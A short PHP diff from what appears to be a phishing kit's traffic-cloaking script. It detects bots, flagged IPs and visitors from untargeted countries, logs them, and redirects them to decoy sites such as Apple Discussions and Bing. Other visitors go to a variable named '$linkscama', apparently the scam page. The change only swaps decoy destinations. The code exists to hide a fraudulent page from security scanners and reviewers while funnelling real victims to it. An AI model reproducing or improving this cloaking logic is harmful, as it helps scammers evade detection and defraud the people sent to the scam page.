@@ -59,8 +59,8 @@ if (deviceBot() === 'NO') {
             header("Location: $linkscama", TRUE, 301);
             exit();
         } else {
-            insertVisitor($origin, "https://theprofitstorm.com/", 'YES', 'Diff country');
-            header("Location: https://theprofitstorm.com/", TRUE, 301);
+            insertVisitor($origin, "Apple Discussions", 'YES', 'Diff country');
+            header("Location: https://discussions.apple.com/community/stores/app-store", TRUE, 301);
             exit();
         }
     } else if ($chek_bot_ip === 'YES') {
@@ -70,6 +70,6 @@ if (deviceBot() === 'NO') {
     }
 } else {
     insertVisitor($origin, "https://bing.com/", 'YES', 'Device bot');
-    header("Location: https://bing.com/?=", TRUE, 301);
+    header("Location: https://bing.com/", TRUE, 301);
     exit();
 }
